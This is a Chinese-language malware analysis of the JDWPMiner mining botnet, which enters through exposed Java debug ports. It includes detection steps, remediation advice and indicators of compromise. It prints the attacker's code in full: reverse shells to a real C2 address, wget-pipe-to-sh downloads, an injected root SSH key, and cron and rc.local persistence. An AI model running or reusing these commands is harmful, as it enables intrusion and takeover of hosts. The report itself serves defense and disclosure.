## 概述

近日，阿里云安全监测到一种利用JDWP
RCE漏洞进行挖矿的恶意攻击，JDWP广泛使用于JAVA应用程序开发调试阶段，而JAVA又广泛用于开发电商、办公应用、CMS等日常息息相关的平台，如果软件发布中未将远程调试关闭，将留下重大隐患，而JDWPMiner正式利用这一特性进行入侵牟利。

阿里云安全专家分析发现，该僵尸网络利用Java Debug
RCE漏洞进行入侵，通过从恶意下载源下载挖矿二进制文件实现挖矿，通过Crontab进行持久化，将秘钥写入authorized_keys而获取远程访问权限，通过四种方式执行反弹shell，最终全权控制主机，对用户资产危害极大。

阿里云安全持续对该BOT进行监控，发现近期传播有所上升，提醒广大用户注意防护。

![image](https://image.3001.net/images/20210804/1628047625_610a09097a73ad0460e18.png!small)

## 传播手段

JDWPMiner通过JDWP
RCE漏洞进行入侵和传播，利用shell.sh脚本下载挖矿木马并执行，通过crontab、cron.d、rc.local进行持久化，依据系统环境执行python、perl、nc、bash进行反弹shell到指定IP，从而完成整个入侵过程。

![image](https://image.3001.net/images/20210804/1628048704_610a0d4099c5bd7aea00e.png!small)

阶段分析

![image](https://image.3001.net/images/20210804/1628048829_610a0dbd7fcfbb4481099.jpg!small)

## 协议分析

JDWP(Java Debug Wire Protocol Transport
Interface)协议是用于调试器(Debugger)和被调试器Java虚拟机(Target
JVM)之间的通信协议。在JDPA体系中，作为前端的调试者(debugger)和后端的被调试程序(debuggee)进程之间的交互数据的格式是由JDWP来描述的，协议详细完整地定义了请求命令、回应数据和错误代码，保证了前后端JVMTI和JDI的通信，通过该协议Debugger可以获取到VM中包括类、对象、线程等信息。

![image](https://image.3001.net/images/20210804/1628061435_610a3efb51dd8ca9837ab.jpg!small)

JDWP是基于TCP的二进制报文的网络协议，通过命令包(command packet)和回复包(reply
packet)进行通信。其中Flags字段用于表明是命令包还是回复包，Command Set定义了Command类别。

![image](https://image.3001.net/images/20210804/1628061465_610a3f1991fbfbaa8826a.png!small)

需要开启上述协议，通常需要在apache-tomcat安装包bin目录下对catalina.sh或者setenv.sh进行修改，其中连接方式有两种，分别是dt_shment代表本机调试和dt_socket代表远程调试。

    
    
    CATALINA_OPTS="-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000"
    

也可通过命令行方式直接开启

    
    
    java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000 -jar demo.jar
    

由于JDWP协议不带有认证信息，对于一个开启了调试端口的JAVA应用，任何人都可以利用JDWP进行调试，这给开发、运维带来了极大的风险，JDWPMiner正是利用该特性进行入侵获利。

## 入侵分析

上述提及两种方式可以导致JDWP端口开放至公网，JDWPMiner通过利用JDWP RCE漏洞进行入侵，在其父进程调用wget

    
    
    java -server -Xms256m -Xmx2048m -XX:MaxPermSize=256m -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000 -jar demo.jar
    

执行命令如下

    
    
    wget http://m247.ltd:36663/.seashells/shell.sh
    

运行shell.sh包含了四种方式进行反弹shell，分别是python、perl、nc、bash，其C2地址为位于卢森堡的192.251.84.152，shell执行后其主机将完全沦陷受到JDWPMiner的管控。

    
    
    if command -v python > /dev/null 2>&amp1 then
            python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("198.251.84.152",42069)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
            exit;
    fi
    
    if command -v perl > /dev/null 2>&amp1 then
            perl -e 'use Socket;$i="198.251.84.152";$p=42069;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
            exit;
    fi
    
    if command -v nc > /dev/null 2>&amp1 then
            rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 198.251.84.152 42069 >/tmp/f
            exit;
    fi
    
    if command -v sh > /dev/null 2>&amp1 then
            /bin/sh -i >& /dev/tcp/198.251.84.152/42069 0>&1
            exit;
    fi
    
    rm -rf shell.sh*
    

而后在teardrop.sh的调用执行中会进行不同方式的持久化

    
    
    wget http://m247.ltd:36663/.xmrig/teardrop.sh -O-    

通过sed将/etc/passwd抹掉常见记录

    
    
    sed -i 's/^eth0:.*//' /etc/passwd 2>/dev/null;
    sed -i 's/^eth0:.*//' /etc/shadow 2>/dev/null;
    sed -i 's/^eth1:.*//' /etc/passwd 2>/dev/null;
    sed -i 's/^eth1:.*//' /etc/shadow 2>/dev/null;
    sed -i 's/^sudev:.*//' /etc/passwd 2>/dev/null;
    sed -i 's/^sudev:.*//' /etc/shadow 2>/dev/null;
    sed -i 's/^system:.*//' /etc/passwd 2>/dev/null;
    sed -i 's/^system:.*//' /etc/shadow 2>/dev/null;
    

添加公钥到/root/.ssh/authorized_keys

    
    
    # add ssh key
    grep Glock /root/.ssh/authorized_keys || echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFjxDDMcytBQ+57s//0Fah9YVEosmvKMQXspMBi2G6qyF/v0nIE0OH9NhPkG02c8B+7ickaSJU97+UqPRw53mDbOJyT1BKWNbGPMAsLA/wz45O5wUhf/VFQhTpsKBai86N0uO3hjAPybE7fT/RarD45Ip4FUG1ttSw/Au6t1oLenRSAPegsS5b5vrn7OsGdA1kk8Jdk2FkdHBjIAHJtZsVsNLnE08WoAKQV65YWL6J5mnKjkt6bsViMeGAdjCbfgKNDdAnAqPfDHv3p+xIB8GnYwK8bVk4N9r/p4YgiNO+uURIWH0XMPJkvkyX4xco7w8XkyhXzKzRlvz8doXj4SMZ root@Glock' >> /root/.ssh/authorized_keys;
    chmod 755 /root /root/.ssh /root/.ssh/authorized_keys 2>/dev/null;
    chown root:root /root /root/.ssh /root/.ssh/authorized_keys 2>/dev/null;
    

通过Crontab进行持久化

    
    
    # Add To Crontab
    grep m247 /var/spool/cron/root || echo "0 * * * * wget --quiet http://m247.ltd:36663/.xmrig/0 -O- 2>/dev/null|sh>/dev/null 2>&1" >> /var/spool/cron/root
    grep m247 /var/spool/cron/crontabs/root || echo "0 * * * * wget --quiet http://m247.ltd:36663/.xmrig/0 -O- 2>/dev/null|sh>/dev/null 2>&1" >> /var/spool/cron/crontabs/root
    grep m247 /etc/crontab || echo "0 * * * * root wget --quiet http://m247.ltd:36663/.xmrig/0 -O- 2>/dev/null|sh>/dev/null 2>&1" >> /etc/crontab
    grep m247 /etc/cron.d/0hourly || echo "0 * * * * root wget --quiet http://m247.ltd:36663/.xmrig/0 -O- 2>/dev/null|sh>/dev/null 2>&1" >> /etc/cron.d/0hourly
    

通过cron.d进行持久化

    
    
    # Add to Cron.d
    echo -e '#!/bin/sh\n\nwget --quiet http://m247.ltd:36663/.xmrig/0 -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/cron.hourly/0;chmod +x /etc/cron.hourly/0;chattr +i /etc/cron.hourly/0;
    echo -e '#!/bin/sh\n\nwget --quiet http://m247.ltd:36663/.xmrig/0 -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/cron.daily/0;chmod +x /etc/cron.daily/0;chattr +i /etc/cron.daily/0;
    echo -e '#!/bin/sh\n\nwget --quiet http://m247.ltd:36663/.xmrig/0 -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/cron.weekly/0;chmod +x /etc/cron.weekly/0;chattr +i /etc/cron.weekly/0;
    echo -e '#!/bin/sh\n\nwget --quiet http://m247.ltd:36663/.xmrig/0 -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/cron.monthly/0;chmod 777 /etc/cron.monthly/0;chattr +i /etc/cron.monthly/0;
    

通过判断不同系统版本使用rc.local进行持久化

    
    
    if [[ -e /etc/debian_version ]]; then
        RCLOCAL='/etc/rc.local';
        echo -e '#!/bin/sh\n\nwget --quiet http://m247.ltd:36663/.etc/rc -O- 2>/dev/null|sh>/dev/null 2>&1' > $RCLOCAL; chmod +x $RCLOCAL;
    elif [[ -e /etc/centos-release || -e /etc/redhat-release ]]; then
        RCLOCAL='/etc/rc.d/rc.local'
        echo -e '#!/bin/sh\n\nwget --quiet http://m247.ltd:36663/.etc/rc -O- 2>/dev/null|sh>/dev/null 2>&1' > $RCLOCAL; chmod +x $RCLOCAL;
        chmod +x $RCLOCAL;
    else
    	echo -e '#!/bin/sh\n\nwget --quiet http://m247.ltd:36663/.etc/rc -O- 2>/dev/null|sh>/dev/null 2>&1' > /etc/rc.local;chmod +x /etc/rc.local;
    fi
    

通过curl、wget进行挖矿木马的下载

    
    
    curl -s http://m247.ltd:36663/.xmrig/miner.php || wget --quiet http://m247.ltd:36663/.xmrig/miner.php -O /dev/null
    

## 安全建议

如何验证

本地验证: 执行如下命令，如果返回结果则说明打开了Debug端口。

    
    
    ps -ef | grep jdwp | grep -v 'grep'
    

远程验证: telnet端口后，输入命令 JDWP-Handshake，如果返回JDWP-Handshare则证明存在漏洞

    
    
    { echo "JDWP-Handshake"; sleep 20 } | telnet remote_host remote_port
    

修复方案

搜索catalina.sh或者setenv.sh，将含有 transport=dt_socket 的一行注释掉即可

如果使用Docker，在dockerfile文件中将 ENV JPDA_ENABLE=1 修改为 0

安全建议

关闭JDWP端口或不对公网开放，如需调试在预发环境进行，完成后关闭Debug模式

关闭Java的Debug模式

云防火墙利用大数据对互联网上最新出现RCE进行实时监控，从RCE披露到响应时间整体小于3小时，能够有效阻止客户资产被RCE漏洞攻击，其支持3-7层协议不仅满足对Web网站的HTTP协议的防护，同时支持4层大量TCP/UDP协议的防御。当前云防火墙默认支持对Java
调试接口远程命令执行漏洞的防御。

![image](https://image.3001.net/images/20210804/1628061902_610a40ce83e8590d4c2da.png!small)

云防火墙智能策略依据历史流量自学习，提供符合客户业务暴露面收敛的最佳实践，通过“一键下发”或“自主选择”可以实现资产的最大程度的互联网暴露收敛，避免类似JDWP端口对外不当暴露风险，同时有效阻止“重保模式”下网络空间测绘的扫描行为。

![image](https://image.3001.net/images/20210804/1628061941_610a40f5ac081e569e88f.png!small)

## IOC

SSH公钥

> ssh-rsa
> AAAAB3NzaC1yc2EAAAADAQABAAABAQDFjxDDMcytBQ+57s//0Fah9YVEosmvKMQXspMBi2G6qyF/v0nIE0OH9NhPkG02c8B+7ickaSJU97+UqPRw53mDbOJyT1BKWNbGPMAsLA/wz45O5wUhf/VFQhTpsKBai86N0uO3hjAPybE7fT/RarD45Ip4FUG1ttSw/Au6t1oLenRSAPegsS5b5vrn7OsGdA1kk8Jdk2FkdHBjIAHJtZsVsNLnE08WoAKQV65YWL6J5mnKjkt6bsViMeGAdjCbfgKNDdAnAqPfDHv3p+xIB8GnYwK8bVk4N9r/p4YgiNO+uURIWH0XMPJkvkyX4xco7w8XkyhXzKzRlvz8doXj4SMZ
> root@Glock

C2

198.251.84.152

Domain

m247.ltd

URL

> http://m247.ltd:36663/..lolthats/sad.php  
> http://m247.ltd:36663/.xmrig/miner.php  
> http://m247.ltd:36663/.xmrig/0  
> http://m247.ltd:36663/.etc/rc  
> http://m247.ltd:36663/..lolthats/0  
> http://m247.ltd/..etc/rc  
> http://m247.ltd:36663/.seashells/shell.sh  
> http://m247.ltd:36663/..etc/rc  
> http://m247.ltd:36663/.xmrig/teardrop.sh

